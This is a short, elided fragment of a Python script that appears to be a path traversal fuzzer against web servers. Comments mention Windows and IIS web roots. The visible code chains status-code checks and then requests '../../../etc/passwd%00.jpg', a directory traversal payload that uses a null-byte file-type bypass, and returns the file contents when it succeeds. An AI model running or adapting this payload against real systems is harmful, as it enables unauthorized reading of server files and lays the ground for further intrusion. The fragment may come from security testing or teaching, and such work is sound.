# Windows versions not verified - would need to do some ennumeration to get likely filepaths
# IIS usually C:\inetpub\wwwroot
                        ...
                        if fuzz_2.status_code == 200:
                            ...
                            if fuzz_3.status_code == 200:
                                ...
                                if right_start.status_code == 200:
                                    ...
                                    right_end = requests.get(url + '../../../etc/passwd%00.jpg', proxies=proxies, verify=False)
                                    if right_end.status_code == 200:
                                        print('[+] Correct file type successful')
                                        return right_end.text
                                    else:
